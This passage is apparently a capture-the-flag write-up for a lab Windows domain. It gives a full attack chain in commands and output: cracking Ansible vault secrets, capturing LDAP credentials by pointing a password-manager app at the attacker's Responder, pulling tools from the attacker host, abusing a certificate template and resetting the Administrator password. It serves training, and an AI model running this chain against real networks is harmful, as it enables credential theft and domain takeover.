./Development/Automation/Ansible
./Development/Automation/Ansible/ADCS
./Development/Automation/Ansible/ADCS/.ansible-lint
./Development/Automation/Ansible/ADCS/.yamllint
./Development/Automation/Ansible/ADCS/defaults
./Development/Automation/Ansible/ADCS/defaults/main.yml
./Development/Automation/Ansible/ADCS/LICENSE
./Development/Automation/Ansible/ADCS/meta
./Development/Automation/Ansible/ADCS/meta/main.yml
./Development/Automation/Ansible/ADCS/meta/preferences.yml
./Development/Automation/Ansible/ADCS/molecule
./Development/Automation/Ansible/ADCS/molecule/default
./Development/Automation/Ansible/ADCS/molecule/default/converge.yml
./Development/Automation/Ansible/ADCS/molecule/default/molecule.yml
./Development/Automation/Ansible/ADCS/molecule/default/prepare.yml
./Development/Automation/Ansible/ADCS/README.md
./Development/Automation/Ansible/ADCS/requirements.txt
./Development/Automation/Ansible/ADCS/requirements.yml
./Development/Automation/Ansible/ADCS/SECURITY.md
./Development/Automation/Ansible/ADCS/tasks
./Development/Automation/Ansible/ADCS/tasks/assert.yml
./Development/Automation/Ansible/ADCS/tasks/generate_ca_certs.yml
./Development/Automation/Ansible/ADCS/tasks/init_ca.yml
./Development/Automation/Ansible/ADCS/tasks/main.yml
./Development/Automation/Ansible/ADCS/tasks/requests.yml
./Development/Automation/Ansible/ADCS/templates
./Development/Automation/Ansible/ADCS/templates/extensions.cnf.j2
./Development/Automation/Ansible/ADCS/templates/openssl.cnf.j2
./Development/Automation/Ansible/ADCS/tox.ini
./Development/Automation/Ansible/ADCS/vars
./Development/Automation/Ansible/ADCS/vars/main.yml
./Development/Automation/Ansible/LDAP
./Development/Automation/Ansible/LDAP/.bin
./Development/Automation/Ansible/LDAP/.bin/clean_vault
./Development/Automation/Ansible/LDAP/.bin/diff_vault
./Development/Automation/Ansible/LDAP/.bin/smudge_vault
./Development/Automation/Ansible/LDAP/.travis.yml
./Development/Automation/Ansible/LDAP/defaults
./Development/Automation/Ansible/LDAP/defaults/main.yml
./Development/Automation/Ansible/LDAP/files
./Development/Automation/Ansible/LDAP/files/pam_mkhomedir
./Development/Automation/Ansible/LDAP/handlers
./Development/Automation/Ansible/LDAP/handlers/main.yml
./Development/Automation/Ansible/LDAP/meta
./Development/Automation/Ansible/LDAP/meta/main.yml
./Development/Automation/Ansible/LDAP/README.md
./Development/Automation/Ansible/LDAP/tasks
./Development/Automation/Ansible/LDAP/tasks/main.yml
./Development/Automation/Ansible/LDAP/templates
./Development/Automation/Ansible/LDAP/templates/ldap_sudo_groups.j2
./Development/Automation/Ansible/LDAP/templates/ldap_sudo_users.j2
./Development/Automation/Ansible/LDAP/templates/sssd.conf.j2
./Development/Automation/Ansible/LDAP/templates/sudo_group.j2
./Development/Automation/Ansible/LDAP/TODO.md
./Development/Automation/Ansible/LDAP/Vagrantfile
./Development/Automation/Ansible/LDAP/vars
./Development/Automation/Ansible/LDAP/vars/debian.yml
./Development/Automation/Ansible/LDAP/vars/main.yml
./Development/Automation/Ansible/LDAP/vars/redhat.yml
./Development/Automation/Ansible/LDAP/vars/ubuntu-14.04.yml
./Development/Automation/Ansible/PWM
./Development/Automation/Ansible/PWM/ansible.cfg
./Development/Automation/Ansible/PWM/ansible_inventory
./Development/Automation/Ansible/PWM/defaults
./Development/Automation/Ansible/PWM/defaults/main.yml
./Development/Automation/Ansible/PWM/handlers
./Development/Automation/Ansible/PWM/handlers/main.yml
./Development/Automation/Ansible/PWM/meta
./Development/Automation/Ansible/PWM/meta/main.yml
./Development/Automation/Ansible/PWM/README.md
./Development/Automation/Ansible/PWM/tasks
./Development/Automation/Ansible/PWM/tasks/main.yml
./Development/Automation/Ansible/PWM/templates
./Development/Automation/Ansible/PWM/templates/context.xml.j2
./Development/Automation/Ansible/PWM/templates/tomcat-users.xml.j2
./Development/Automation/Ansible/SHARE
./Development/Automation/Ansible/SHARE/tasks
./Development/Automation/Ansible/SHARE/tasks/main.yml
./IPC$
./IPC$/InitShutdown
./IPC$/lsass
./IPC$/ntsvcs
./IPC$/scerpc
./IPC$/epmapper
./IPC$/LSM_API_service
./IPC$/eventlog
./IPC$/atsvc
./IPC$/wkssvc
./IPC$/70e769e837c86dc3
./IPC$/srvsvc
./IPC$/spoolss
./IPC$/vgauth-service
./IPC$/W32TIME_ALT
./IPC$/tapsrv
./IPC$/ROUTER
./IPC$/cert
./IPC$/MsFteWds
```

```c
$ cat ./Development/Automation/Ansible/ADCS/defaults/main.yml
---
# defaults file for ca

# set ca_init: 'yes' to create CA
ca_init: yes

# ca_own_root: 'yes' if you want to have yout own root CA.
# if no, set ca_certificate_path manually
ca_own_root: yes

# A passphrase for the CA key.
ca_passphrase: SuP3rS3creT

# The common name for the CA.
ca_common_name: authority.htb

# Other details for the CA.
ca_country_name: NL
ca_email_address: admin@authority.htb
ca_organization_name: htb
ca_organizational_unit_name: htb
ca_state_or_province_name: Utrecht
ca_locality_name: Utrecht

# There are two formats to request a key and certificate:
# 1. With details: (Includes `name:`)
# ca_requests:
#   - name: certificate1.example.com
#     passphrase: S3creT
#
# 2. Without details: (Does not include `name:`)
# ca_requests:
#   - "{{ ansible_fqdn }}"

# You can also mix these formats:
# ca_requests:
#   - name: certificate1.example.com
#     passphrase: S3creT
#   - "{{ ansible_fqdn }}"

# Where to publish the certificates, normally a webserver location.
# If not specified, certificates will not be published.
# {{ httpd_data_directory }} is inheritted from the role robertdebock.httpd.
ca_publication_location: "{{ httpd_data_directory | default('/tmp') }}/pub"

# Where do the certificates need to be stored? By default the distribution
# preferred locations are used (see `vars/main.yml`, under `_ca_openssl_path`.
# If you need a CA certificate somewhere else, simple use something like this:
# ca_openssl_path: /my/preferred/path
ca_openssl_path: "{{ _ca_openssl_path[ansible_os_family] | default(_ca_openssl_path['default'] ) }}"
```

```c
$ cat ./Development/Automation/Ansible/PWM/defaults/main.yml
---
pwm_run_dir: "{{ lookup('env', 'PWD') }}"

pwm_hostname: authority.htb.corp
pwm_http_port: "{{ http_port }}"
pwm_https_port: "{{ https_port }}"
pwm_https_enable: true

pwm_require_ssl: false

pwm_admin_login: !vault |
          $ANSIBLE_VAULT;1.1;AES256
          32666534386435366537653136663731633138616264323230383566333966346662313161326239
          6134353663663462373265633832356663356239383039640a346431373431666433343434366139
          35653634376333666234613466396534343030656165396464323564373334616262613439343033
          6334326263326364380a653034313733326639323433626130343834663538326439636232306531
          3438

pwm_admin_password: !vault |
          $ANSIBLE_VAULT;1.1;AES256
          31356338343963323063373435363261323563393235633365356134616261666433393263373736
          3335616263326464633832376261306131303337653964350a363663623132353136346631396662
          38656432323830393339336231373637303535613636646561653637386634613862316638353530
          3930356637306461350a316466663037303037653761323565343338653934646533663365363035
          6531

ldap_uri: ldap://127.0.0.1/
ldap_base_dn: "DC=authority,DC=htb"
ldap_admin_password: !vault |
          $ANSIBLE_VAULT;1.1;AES256
          63303831303534303266356462373731393561313363313038376166336536666232626461653630
          3437333035366235613437373733316635313530326639330a643034623530623439616136363563
          34646237336164356438383034623462323531316333623135383134656263663266653938333334
          3238343230333633350a646664396565633037333431626163306531336336326665316430613566
          3764
```

```c
$ANSIBLE_VAULT;1.1;AES256
          32666534386435366537653136663731633138616264323230383566333966346662313161326239
          6134353663663462373265633832356663356239383039640a346431373431666433343434366139
          35653634376333666234613466396534343030656165396464323564373334616262613439343033
          6334326263326364380a653034313733326639323433626130343834663538326439636232306531
          3438
```

```c
$ANSIBLE_VAULT;1.1;AES256
          31356338343963323063373435363261323563393235633365356134616261666433393263373736
          3335616263326464633832376261306131303337653964350a363663623132353136346631396662
          38656432323830393339336231373637303535613636646561653637386634613862316638353530
          3930356637306461350a316466663037303037653761323565343338653934646533663365363035
          6531
```

```c
ldap_admin_password: !vault |
          $ANSIBLE_VAULT;1.1;AES256
          63303831303534303266356462373731393561313363313038376166336536666232626461653630
          3437333035366235613437373733316635313530326639330a643034623530623439616136363563
          34646237336164356438383034623462323531316333623135383134656263663266653938333334
          3238343230333633350a646664396565633037333431626163306531336336326665316430613566
          3764
```

```c
$ cat ./Development/Automation/Ansible/PWM/templates/tomcat-users.xml.j2
<?xml version='1.0' encoding='cp1252'?>

<tomcat-users xmlns="http://tomcat.apache.org/xml" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
 xsi:schemaLocation="http://tomcat.apache.org/xml tomcat-users.xsd"
 version="1.0">

<user username="admin" password="T0mc@tAdm1n" roles="manager-gui"/>  
<user username="robot" password="T0mc@tR00t" roles="manager-script"/>

</tomcat-users>
```

| Username | Password |
| --- | --- |
| admin | T0mc@tAdm1n |
| robot | T0mc@tR00t |

## Cracking Vault Password with john

```c
$ cat hash_raw
$ANSIBLE_VAULT;1.1;AES256
63303831303534303266356462373731393561313363313038376166336536666232626461653630
3437333035366235613437373733316635313530326639330a643034623530623439616136363563
34646237336164356438383034623462323531316333623135383134656263663266653938333334
3238343230333633350a646664396565633037333431626163306531336336326665316430613566
3764
```

```c
$ ansible2john hash_raw > hash
```

```c
$ sudo john hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (ansible, Ansible Vault [PBKDF2-SHA256 HMAC-256 256/256 AVX2 8x])
Cost 1 (iteration count) is 10000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
!@#$%^&*         (hash_raw)     
1g 0:00:00:12 DONE (2023-07-16 10:24) 0.08183g/s 3257p/s 3257c/s 3257C/s 051790..victor2
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

| Password |
| --- |
| !@#$%^&* |

## Decrypting Ansible Vault

> https://docs.ansible.com/ansible/latest/installation_guide/intro_installation.html

```c
$ python3 -m pip install --user ansible
Collecting ansible
  Downloading ansible-8.1.0-py3-none-any.whl (44.8 MB)
     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 44.8/44.8 MB 36.5 MB/s eta 0:00:00
Collecting ansible-core~=2.15.1 (from ansible)
  Downloading ansible_core-2.15.1-py3-none-any.whl (2.2 MB)
     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 2.2/2.2 MB 39.8 MB/s eta 0:00:00
Requirement already satisfied: jinja2>=3.0.0 in /usr/lib/python3/dist-packages (from ansible-core~=2.15.1->ansible) (3.1.2)
Requirement already satisfied: PyYAML>=5.1 in /usr/lib/python3/dist-packages (from ansible-core~=2.15.1->ansible) (6.0)
Requirement already satisfied: cryptography in /usr/lib/python3/dist-packages (from ansible-core~=2.15.1->ansible) (38.0.4)
Requirement already satisfied: packaging in ./.local/lib/python3.11/site-packages (from ansible-core~=2.15.1->ansible) (20.9)
Collecting resolvelib<1.1.0,>=0.5.3 (from ansible-core~=2.15.1->ansible)
  Downloading resolvelib-1.0.1-py2.py3-none-any.whl (17 kB)
Requirement already satisfied: pyparsing>=2.0.2 in /usr/lib/python3/dist-packages (from packaging->ansible-core~=2.15.1->ansible) (3.0.9)
Installing collected packages: resolvelib, ansible-core, ansible
Successfully installed ansible-8.1.0 ansible-core-2.15.1 resolvelib-1.0.1
```

```c
$ python3 -m pip install --user ansible-core==2.12.3
Collecting ansible-core==2.12.3
  Downloading ansible-core-2.12.3.tar.gz (7.8 MB)
     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 7.8/7.8 MB 22.7 MB/s eta 0:00:00
  Preparing metadata (setup.py) ... done
Requirement already satisfied: PyYAML in /usr/lib/python3/dist-packages (from ansible-core==2.12.3) (6.0)
Requirement already satisfied: cryptography in /usr/lib/python3/dist-packages (from ansible-core==2.12.3) (38.0.4)
Requirement already satisfied: jinja2 in /usr/lib/python3/dist-packages (from ansible-core==2.12.3) (3.1.2)
Requirement already satisfied: packaging in ./.local/lib/python3.11/site-packages (from ansible-core==2.12.3) (20.9)
Collecting resolvelib<0.6.0,>=0.5.3 (from ansible-core==2.12.3)
  Downloading resolvelib-0.5.4-py2.py3-none-any.whl (12 kB)
Requirement already satisfied: pyparsing>=2.0.2 in /usr/lib/python3/dist-packages (from packaging->ansible-core==2.12.3) (3.0.9)
Building wheels for collected packages: ansible-core
  Building wheel for ansible-core (setup.py) ... done
  Created wheel for ansible-core: filename=ansible_core-2.12.3-py3-none-any.whl size=2076482 sha256=542d045de0b49afd983418883fa85f541f81c8357d14309e6ba160f7e2dff068
  Stored in directory: /home/username/.cache/pip/wheels/31/d6/ae/c2258ce7c7940a3ea46d95161ea15694eacb83652b89e212f4
Successfully built ansible-core
Installing collected packages: resolvelib, ansible-core
  Attempting uninstall: resolvelib
    Found existing installation: resolvelib 1.0.1
    Uninstalling resolvelib-1.0.1:
      Successfully uninstalled resolvelib-1.0.1
  Attempting uninstall: ansible-core
    Found existing installation: ansible-core 2.15.1
    Uninstalling ansible-core-2.15.1:
      Successfully uninstalled ansible-core-2.15.1
ERROR: pip's dependency resolver does not currently take into account all the packages that are installed. This behaviour is the source of the following dependency conflicts.
ansible 8.1.0 requires ansible-core~=2.15.1, but you have ansible-core 2.12.3 which is incompatible.                                                                                                                                        
Successfully installed ansible-core-2.12.3 resolvelib-0.5.4
```

```c
$ cat vault_hash1 
$ANSIBLE_VAULT;1.1;AES256
32666534386435366537653136663731633138616264323230383566333966346662313161326239
6134353663663462373265633832356663356239383039640a346431373431666433343434366139
35653634376333666234613466396534343030656165396464323564373334616262613439343033
6334326263326364380a653034313733326639323433626130343834663538326439636232306531
3438
```

```c
$ cat vault_hash1 | ansible-vault decrypt
Vault password: 
Decryption successful
svc_pwm
```

```c
$ cat vault_hash2
$ANSIBLE_VAULT;1.1;AES256
31356338343963323063373435363261323563393235633365356134616261666433393263373736
3335616263326464633832376261306131303337653964350a363663623132353136346631396662
38656432323830393339336231373637303535613636646561653637386634613862316638353530
3930356637306461350a316466663037303037653761323565343338653934646533663365363035
6531
```

```c
$ cat vault_hash2 | ansible-vault decrypt
Vault password: 
Decryption successful
pWm_@dm!N_!23
```

| Password |
| --- |
| pWm_@dm!N_!23 |

```c
$ cat vault_hash3 
$ANSIBLE_VAULT;1.1;AES256
63303831303534303266356462373731393561313363313038376166336536666232626461653630
3437333035366235613437373733316635313530326639330a643034623530623439616136363563
34646237336164356438383034623462323531316333623135383134656263663266653938333334
3238343230333633350a646664396565633037333431626163306531336336326665316430613566
3764
```

```c
$ cat vault_hash3 | ansible-vault decrypt
Vault password: 
Decryption successful
DevT3st@123
```

| Password |
| --- |
| DevT3st@123 |

Shoutout to `xvt` for this diamond:

```c
$ sudo apt-get install ripgrep
```

```c
$ cat ./Development/Automation/Ansible/PWM/defaults/main.yml | rg --multiline -e '\$ANSIBLE_VAULT;1.1;AES256$(\n.+)+' | sed 's/\s//g'
$ANSIBLE_VAULT;1.1;AES256
32666534386435366537653136663731633138616264323230383566333966346662313161326239
6134353663663462373265633832356663356239383039640a346431373431666433343434366139
35653634376333666234613466396534343030656165396464323564373334616262613439343033
6334326263326364380a653034313733326639323433626130343834663538326439636232306531
3438
$ANSIBLE_VAULT;1.1;AES256
31356338343963323063373435363261323563393235633365356134616261666433393263373736
3335616263326464633832376261306131303337653964350a363663623132353136346631396662
38656432323830393339336231373637303535613636646561653637386634613862316638353530
3930356637306461350a316466663037303037653761323565343338653934646533663365363035
6531
$ANSIBLE_VAULT;1.1;AES256
63303831303534303266356462373731393561313363313038376166336536666232626461653630
3437333035366235613437373733316635313530326639330a643034623530623439616136363563
34646237336164356438383034623462323531316333623135383134656263663266653938333334
3238343230333633350a646664396565633037333431626163306531336336326665316430613566
3764
```

## Re-configuration of LDAP Connector

> https://authority.htb:8443/pwm/private/config/login

| Password |
| --- |
| pWm_@dm!N_!23 |

First of all, we found a new subdomain which we added also to our `/etc/hosts` file.

```c
ldaps://authority.authority.htb:636
```

```c
$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
10.129.214.151  authority.htb
10.129.214.151  authority.authority.htb
```

Then we added a new `LDAP URL` and pointed to our local machine.

```c
ldap://10.10.16.26:389
```

Then we moved it up by using the `up arrow`.

## Foothold

### Grabbing Credentials via Responder

```c
$ sudo responder -I tun0
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.3.0

  To support this project:
  Patreon -> https://www.patreon.com/PythonResponder
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.16.26]
    Responder IPv6             [dead:beef:4::1018]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-SHXB6UZDALS]
    Responder Domain Name      [SGD8.LOCAL]
    Responder DCE-RPC Port     [46307]

[+] Listening for events...
```

Then we clicked on `Test LDAP Connection`

```c
[LDAP] Cleartext Client   : 10.129.214.151
[LDAP] Cleartext Username : CN=svc_ldap,OU=Service Accounts,OU=CORP,DC=authority,DC=htb
[LDAP] Cleartext Password : lDaP_1n_th3_cle4r!
[*] Skipping previously captured cleartext password for CN=svc_ldap,OU=Service Accounts,OU=CORP,DC=authority,DC=htb
```

| Username | Password |
| --- | --- |
| svc_ldap | lDaP_1n_th3_cle4r! |

```c
$ evil-winrm -i 10.129.214.151 -u 'svc_ldap' -p 'lDaP_1n_th3_cle4r!'
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc_ldap\Documents>
```

## user.txt

```c
*Evil-WinRM* PS C:\Users\svc_ldap\Desktop> cat user.txt
9f39a260b03fe1f015af877a3051d71a
```

## Enumeration

```c
*Evil-WinRM* PS C:\Users\svc_ldap\Documents> whoami /all

USER INFORMATION
----------------

User Name    SID
============ =============================================
htb\svc_ldap S-1-5-21-622327497-3269355298-2248959698-1601


GROUP INFORMATION
-----------------

Group Name                                  Type             SID          Attributes
=========================================== ================ ============ ==================================================
Everyone                                    Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
BUILTIN\Certificate Service DCOM Access     Alias            S-1-5-32-574 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```

So we assumed that the `privilege escalation` vector had to be `Active Directory Certificate Services (ADCS)`, based on the box name.

## Checking for Active Directory Certificate Services (ADCS)

> https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Certify.exe

```c
*Evil-WinRM* PS C:\temp> powershell -command Invoke-WebRequest -Uri http://10.10.16.26/Certify.exe -Outfile C:\\Users\\svc_ldap\\Documents\\Certify.exe
```

```c
*Evil-WinRM* PS C:\Users\svc_ldap\Documents> .\Certify.exe find /vulnerable

   _____          _   _  __
  / ____|        | | (_)/ _|
 | |     ___ _ __| |_ _| |_ _   _
 | |    / _ \ '__| __| |  _| | | |
 | |___|  __/ |  | |_| | | | |_| |
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v1.0.0

[*] Action: Find certificate templates
[*] Using the search base 'CN=Configuration,DC=authority,DC=htb'

[*] Listing info about the Enterprise CA 'AUTHORITY-CA'

    Enterprise CA Name            : AUTHORITY-CA
    DNS Hostname                  : authority.authority.htb
    FullName                      : authority.authority.htb\AUTHORITY-CA
    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
    Cert SubjectName              : CN=AUTHORITY-CA, DC=authority, DC=htb
    Cert Thumbprint               : 42A80DC79DD9CE76D032080B2F8B172BC29B0182
    Cert Serial                   : 2C4E1F3CA46BBDAF42A1DDE3EC33A6B4
    Cert Start Date               : 4/23/2023 9:46:26 PM
    Cert End Date                 : 4/23/2123 9:56:25 PM
    Cert Chain                    : CN=AUTHORITY-CA,DC=authority,DC=htb
    UserSpecifiedSAN              : Disabled
    CA Permissions                :
      Owner: BUILTIN\Administrators        S-1-5-32-544

      Access Rights                                     Principal

      Allow  Enroll                                     NT AUTHORITY\Authenticated UsersS-1-5-11
      Allow  ManageCA, ManageCertificates               BUILTIN\Administrators        S-1-5-32-544
      Allow  ManageCA, ManageCertificates               HTB\Domain Admins             S-1-5-21-622327497-3269355298-2248959698-512
      Allow  ManageCA, ManageCertificates               HTB\Enterprise Admins         S-1-5-21-622327497-3269355298-2248959698-519
    Enrollment Agent Restrictions : None

[!] Vulnerable Certificates Templates :

    CA Name                               : authority.authority.htb\AUTHORITY-CA
    Template Name                         : CorpVPN
    Schema Version                        : 2
    Validity Period                       : 20 years
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS, AUTO_ENROLLMENT_CHECK_USER_DS_CERTIFICATE
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Client Authentication, Document Signing, Encrypting File System, IP security IKE intermediate, IP security user, KDC Authentication, Secure Email
    mspki-certificate-application-policy  : Client Authentication, Document Signing, Encrypting File System, IP security IKE intermediate, IP security user, KDC Authentication, Secure Email
    Permissions
      Enrollment Permissions
        Enrollment Rights           : HTB\Domain Admins             S-1-5-21-622327497-3269355298-2248959698-512
                                      HTB\Domain Computers          S-1-5-21-622327497-3269355298-2248959698-515
                                      HTB\Enterprise Admins         S-1-5-21-622327497-3269355298-2248959698-519
      Object Control Permissions
        Owner                       : HTB\Administrator             S-1-5-21-622327497-3269355298-2248959698-500
        WriteOwner Principals       : HTB\Administrator             S-1-5-21-622327497-3269355298-2248959698-500
                                      HTB\Domain Admins             S-1-5-21-622327497-3269355298-2248959698-512
                                      HTB\Enterprise Admins         S-1-5-21-622327497-3269355298-2248959698-519
        WriteDacl Principals        : HTB\Administrator             S-1-5-21-622327497-3269355298-2248959698-500
                                      HTB\Domain Admins             S-1-5-21-622327497-3269355298-2248959698-512
                                      HTB\Enterprise Admins         S-1-5-21-622327497-3269355298-2248959698-519
        WriteProperty Principals    : HTB\Administrator             S-1-5-21-622327497-3269355298-2248959698-500
                                      HTB\Domain Admins             S-1-5-21-622327497-3269355298-2248959698-512
                                      HTB\Enterprise Admins         S-1-5-21-622327497-3269355298-2248959698-519



Certify completed in 00:00:10.6148544
```

## Verify Attack Path with BloodHound

```c
$ bloodhound-python -d authority.htb -u svc_ldap -p 'lDaP_1n_th3_cle4r!' -gc authority.htb -c all -ns 10.129.214.151
INFO: Found AD domain: authority.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
INFO: Connecting to LDAP server: authority.authority.htb
WARNING: LDAP Authentication is refused because LDAP signing is enabled. Trying to connect over LDAPS instead...
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: authority.authority.htb
WARNING: LDAP Authentication is refused because LDAP signing is enabled. Trying to connect over LDAPS instead...
INFO: Found 5 users
INFO: Found 52 groups
INFO: Found 3 gpos
INFO: Found 3 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: authority.authority.htb
INFO: Done in 00M 20S
```

```c
$ sudo neo4j start
Directories in use:
home:         /usr/share/neo4j
config:       /usr/share/neo4j/conf
logs:         /etc/neo4j/logs
plugins:      /usr/share/neo4j/plugins
import:       /usr/share/neo4j/import
data:         /etc/neo4j/data
certificates: /usr/share/neo4j/certificates
licenses:     /usr/share/neo4j/licenses
run:          /var/lib/neo4j/run
Starting Neo4j.
Started neo4j (pid:72225). It is available at http://localhost:7474
There may be a short delay until the server is ready.
```

> https://github.com/ly4k/BloodHound/

## Adding a Computer to the Active Directory

> https://github.com/Kevin-Robertson/Powermad

```c
$ wget https://raw.githubusercontent.com/Kevin-Robertson/Powermad/master/Powermad.ps1
--2023-07-16 11:38:45--  https://raw.githubusercontent.com/Kevin-Robertson/Powermad/master/Powermad.ps1
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.111.133, 185.199.108.133, 185.199.109.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.111.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 135576 (132K) [text/plain]
Saving to: ‘Powermad.ps1’

Powermad.ps1                                               100%[========================================================================================================================================>] 132.40K  --.-KB/s    in 0.1s    

2023-07-16 11:38:45 (921 KB/s) - ‘Powermad.ps1’ saved [135576/135576]
```

```c
*Evil-WinRM* PS C:\Users\svc_ldap\Documents> powershell -command Invoke-WebRequest -Uri http://10.10.16.26/Powermad.ps1 -Outfile C:\\Users\\svc_ldap\\Documents\\Powermad.ps1
```

```c
*Evil-WinRM* PS C:\Users\svc_ldap\Documents> Import-Module ./Powermad.ps1
```

```c
*Evil-WinRM* PS C:\Users\svc_ldap\Documents> $secureString = convertto-securestring "Password123" -asplaintext -force
```

```c
*Evil-WinRM* PS C:\Users\svc_ldap\Documents> New-MachineAccount -MachineAccount foobar -Domain authority.htb -DomainController authority.htb -Password $secureString
[+] Machine account foobar added
```

## Requesting Certificate

```c
$ certipy-ad req -username 'foobar$' -password 'Password123' -ca AUTHORITY-CA -target authority.authority.htb -template CorpVPN -upn administrator@authority.htb -dns authority.authority.htb
```

```c
$ certipy-ad req -username 'foobar$' -password 'Password123' -ca AUTHORITY-CA -target authority.authority.htb -template CorpVPN -dc-ip 10.129.214.151 -upn administrator@authority.htb -dns authority.authority.htb       
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error: The NETBIOS connection with the remote host timed out.
[-] Use -debug to print a stacktrace
```

We waited for about 10 seconds...

```c
$ certipy-ad req -username 'foobar$' -password 'Password123' -ca AUTHORITY-CA -target authority.authority.htb -template CorpVPN -dc-ip 10.129.214.151 -upn administrator@authority.htb -dns authority.authority.htb
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 5
[*] Got certificate with multiple identifications
    UPN: 'administrator@authority.htb'
    DNS Host Name: 'authority.authority.htb'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator_authority.pfx'
```

## Pass the Cert

> https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html

> https://github.com/AlmondOffSec/PassTheCert/tree/main/Python

```c
$ certipy-ad cert -pfx administrator_authority.pfx -nokey -out administrator_authority.crt 
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Writing certificate and  to 'administrator_authority.crt'
```

```c
$ certipy-ad cert -pfx administrator_authority.pfx -nocert -out administrator_authority.key
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Writing private key to 'administrator_authority.key'
```

```c
$ python3 /home/username/opt/10_post_exploitation/PassTheCert/Python/passthecert.py -domain 'authority.htb' -dc-host 'authority.htb' -action 'modify_user' -target 'Administrator' -new-pass 'Password123' -crt ./administrator_authority.crt -key ./administrator_authority.key
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Successfully changed Administrator password to: Password123
```

```c
$ evil-winrm -i 'authority.htb' -u 'administrator' -p 'Password123'
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
